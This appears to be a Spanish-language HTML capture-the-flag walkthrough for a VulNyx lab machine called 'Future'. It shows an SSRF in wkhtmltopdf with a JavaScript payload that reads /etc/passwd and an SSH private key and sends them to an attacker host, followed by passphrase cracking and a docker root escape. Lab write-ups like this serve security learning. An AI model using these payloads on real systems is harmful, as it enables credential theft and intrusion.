@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Future</title>
+    <link rel="stylesheet" href="../../pagesmach.css">
+    <link rel="icon" href="../../img/vulnyx.ico" type="image/x-icon">
+</head>
+<body>
+    <div class="contenedor">
+        <h1>Future</h1>
+        <div class="text-img">
+            <img src="img/Future/logo.png" alt="" class="img-principal">
+            <p class="text">Esta maquina presenta lo siguiente:</p>
+            <img src="img/Future/1.png" alt="" class="img-sec">
+            <p>Se ve los siguientes puertos abiertos:
+                <br>
+                22,80
+                <br>
+                Por lo que nos ponemos a verificar las pagina del purto 80            </p>
+            <img src="img/Future/2.png" alt="" class="img-sec">
+            <p>Por lo que procedemos o a interactuar o buscar directorios con gobuster <br> Gobuster:</p>
+            <div class="card">
+              <div class="tools">
+                <div class="circle">
+                  <span class="red box"></span>
+                </div>
+                <div class="circle">
+                  <span class="yellow box"></span>
+                </div>
+                <div class="circle">
+                  <span class="green box"></span>
+                </div>
+              </div>
+              <div class="card__content">
+                  <pre><span>gobuster dir -u http://IP/ -w "direccion del diccionario" -x .php,.html</span></pre>
+              </div>
+            </div>
+            <img src="img/Future/6.png" alt="" class="img-sec">
+            <p>Interactuar:</p>
+            <img src="img/Future/3.png" alt="" class="img-sec">
+            <br>
+            <img src="img/Future/4.png" alt="" class="img-sec">
+            <p>En ambos casos existe la pagina homework.html</p>
+            <img src="img/Future/5.png" alt="" class="img-sec">
+            <p>Observamos que es una pagina para subir codigo html asi que lo subimos y lo interceptamos con burp-suite</p>
+            <img src="img/Future/7.png" alt="" class="img-sec">
+            <p>Vemos que se sube con previsualizacion del codigo posible SSRF</p>
+            <img src="img/Future/8.png" alt="" class="img-sec">
+            <p>realizamos una solicitud y nos ponemos a la escucha por el mismo puerto para ver si podemos conectarnos</p>
+            <img src="img/Future/10.png" alt="" class="img-sec">
+            <p>Observamos de que la pagina usa wkhtmltopdf por lo que podemos buscar una forma de explotar esa herramienta y es un SSRF por lo que ejecutamos en la captura lo siguiente:</p>
+            <div class="card2">
+                <div class="tools">
+                  <div class="circle">
+                    <span class="red box"></span>
+                  </div>
+                  <div class="circle">
+                    <span class="yellow box"></span>
+                  </div>
+                  <div class="circle">
+                    <span class="green box"></span>
+                  </div>
+                </div>
+                <div class="card__content">
+                    <pre>
+                    <code>
+"Todo dentro de una etiqueta script"
+  var readfile = new XMLHttpRequest(); // Read the local file
+  var exfil = new XMLHttpRequest(); // Send the file to our server
+  readfile.open("GET","file:///etc/passwd", true);
+  readfile.send();
+  readfile.onload = function() {
+    if (readfile.readyState === 4) {
+      var url = 'http://IPatac:PORT/?data='+btoa(this.response);
+      exfil.open("GET", url, true);
+      exfil.send();
+      }
+    }
+    readfile.onerror = function(){document.write('<a>Oops!</a>');}
+     </code>
+                  </pre>
+                </div>
+              </div>
+              <img src="img/Future/12.png" alt="" class="img-sec">
+              <p>y nos volvemos a colocar a la escucha</p>
+              <div class="card">
+                <div class="tools">
+                  <div class="circle">
+                    <span class="red box"></span>
+                  </div>
+                  <div class="circle">
+                    <span class="yellow box"></span>
+                  </div>
+                  <div class="circle">
+                    <span class="green box"></span>
+                  </div>
+                </div>
+                <div class="card__content">
+                    <pre><span>nc -lnpv 443</span></pre>
+                </div>
+              </div>
+              <p>Nos va allegar el siguiente contenido al enviar desde el burp-suite</p>
+              <img src="img/Future/13.png" alt="" class="img-sec">
+              <p>copiamos y pasamos por base64 -d</p>
+            <div class="card">
+                <div class="tools">
+                  <div class="circle">
+                    <span class="red box"></span>
+                  </div>
+                  <div class="circle">
+                    <span class="yellow box"></span>
+                  </div>
+                  <div class="circle">
+                    <span class="green box"></span>
+                  </div>
+                </div>
+                <div class="card__content">
+                    <pre><span>echo"TEXTO"|base64 -d</span></pre>
+                </div>
+              </div>
+              <img src="img/Future/14.png" alt="" class="img-sec">
+              <p>filtramos y encontramos 2 usuarios que nos podrian interesar <br> Intentamos obtener su llave de ssh por el mismo medio</p>
+              <div class="card2">
+                <div class="tools">
+                  <div class="circle">
+                    <span class="red box"></span>
+                  </div>
+                  <div class="circle">
+                    <span class="yellow box"></span>
+                  </div>
+                  <div class="circle">
+                    <span class="green box"></span>
+                  </div>
+                </div>
+                <div class="card__content">
+                    <pre>
+                    <code>
+"Todo dentro de una etiqueta script"
+  var readfile = new XMLHttpRequest(); // Read the local file
+  var exfil = new XMLHttpRequest(); // Send the file to our server
+  readfile.open("GET","file:///home/marty.mcfly/.ssh/id_rsa", true);
+  readfile.send();
+  readfile.onload = function() {
+    if (readfile.readyState === 4) {
+      var url = 'http://IPatac:PORT/?data='+btoa(this.response);
+      exfil.open("GET", url, true);
+      exfil.send();
+      }
+    }
+    readfile.onerror = function(){document.write('<a>Oops!</a>');}
+     </code>
+                  </pre>
+                </div>
+              </div>
+              <img src="img/Future/15.png" alt="" class="img-sec">
+              <p>realizamos igual por base64 y lo pasamos a un archivo</p>
+              <div class="card">
+                <div class="tools">
+                  <div class="circle">
+                    <span class="red box"></span>
+                  </div>
+                  <div class="circle">
+                    <span class="yellow box"></span>
+                  </div>
+                  <div class="circle">
+                    <span class="green box"></span>
+                  </div>
+                </div>
+                <div class="card__content">
+                    <pre><span>echo"TEXTO"|base64 -d > id_rsa</span></span></pre>
+                </div>
+              </div>
+              <img src="img/Future/16.png" alt="" class="img-sec">
+              <p>Ahora le damos los permisos y la usamos por ssh</p>
+              <div class="card">
+                <div class="tools">
+                  <div class="circle">
+                    <span class="red box"></span>
+                  </div>
+                  <div class="circle">
+                    <span class="yellow box"></span>
+                  </div>
+                  <div class="circle">
+                    <span class="green box"></span>
+                  </div>
+                </div>
+                <div class="card__content">
+                    <pre><span>chmod 600 id_rsa</span></pre>
+                </div>
+              </div>
+              <img src="img/Future/17.png" alt="" class="img-sec">
+              <p>Pero tiene contraseña asi que la crackeamos </p>
+              <div class="card">
+                <div class="tools">
+                  <div class="circle">
+                    <span class="red box"></span>
+                  </div>
+                  <div class="circle">
+                    <span class="yellow box"></span>
+                  </div>
+                  <div class="circle">
+                    <span class="green box"></span>
+                  </div>
+                </div>
+                <div class="card__content">
+                    <pre><span>ssh2jhon id_rsa > hash</span></span></pre>
+                </div>
+              </div>
+              <p>ahora realizamos la wordlist ya que no se encuentra en el rockyou</p>
+              <div class="card">
+                <div class="tools">
+                  <div class="circle">
+                    <span class="red box"></span>
+                  </div>
+                  <div class="circle">
+                    <span class="yellow box"></span>
+                  </div>
+                  <div class="circle">
+                    <span class="green box"></span>
+                  </div>
+                </div>
+                <div class="card__content">
+                    <pre><span>cewl "paginas encontradas con gobuster"> wordlist1</span></span></pre>
+                </div>
+              </div>
+              <p>Y los unimos</p>
+              <div class="card">
+                <div class="tools">
+                  <div class="circle">
+                    <span class="red box"></span>
+                  </div>
+                  <div class="circle">
+                    <span class="yellow box"></span>
+                  </div>
+                  <div class="circle">
+                    <span class="green box"></span>
+                  </div>
+                </div>
+                <div class="card__content">
+                    <pre><span>cat wordlist* > wordlistcomplete.txt </span></span></span></pre>
+                </div>
+              </div>
+              <p>y ahora lo crackeamos</p>
+              <div class="card">
+                <div class="tools">
+                  <div class="circle">
+                    <span class="red box"></span>
+                  </div>
+                  <div class="circle">
+                    <span class="yellow box"></span>
+                  </div>
+                  <div class="circle">
+                    <span class="green box"></span>
+                  </div>
+                </div>
+                <div class="card__content">
+                    <pre><span>jhon -w=wordlistcomplete.txt hash</span></span></pre>
+                </div>
+              </div>
+              <p>Y obtenemos la contraseña</p>
+              <img src="img/Future/18.png" alt="" class="img-sec">
+              <p>Volvemos a conectarnos por ssh</p>
+              <img src="img/Future/19.png" alt="" class="img-sec">
+              <p>Procedemos a elevar privilegios por lo que buscamos con find lo que podemos ejecutar como root</p>
+              <div class="card">
+                <div class="tools">
+                  <div class="circle">
+                    <span class="red box"></span>
+                  </div>
+                  <div class="circle">
+                    <span class="yellow box"></span>
+                  </div>
+                  <div class="circle">
+                    <span class="green box"></span>
+                  </div>
+                </div>
+                <div class="card__content">
+                    <pre><span>find / -perm -4000 2>/dev/null</span></span></pre>
+                </div>
+              </div>
+            <img src="img/Future/20.png" alt="" class="img-sec">
+            <p>Vemos que Tenemos a Docker para ejecutar como root asi que usamos <br><a href="https://gtfobins.github.io">GTFOBins</a></p>
+            <div class="card">
+                <div class="tools">
+                  <div class="circle">
+                    <span class="red box"></span>
+                  </div>
+                  <div class="circle">
+                    <span class="yellow box"></span>
+                  </div>
+                  <div class="circle">
+                    <span class="green box"></span>
+                  </div>
+                </div>
+                <div class="card__content">
+                    <pre><span>/usr/bin/docker docker run -v /:/mnt --rm -it alpine chroot /mnt bash</span></pre>
+                </div>
+              </div>
+            <img src="img/Future/21.png" alt="" class="img-sec">
+            <p>Con esto la maquina esta completa revisa las carpetas de los usuarios.</p>
+        </div>
+    </div>
+    <div class="loader" id="loader">
+      <div data-glitch="Loading..." class="glitch">Loading...</div>
+   </div>
+    <script>
+      window.addEventListener("load", function(){
+        document.getElementById("loader").classList.toggle("loading");
+      })
+    </script>
+</body>
+</html>
+
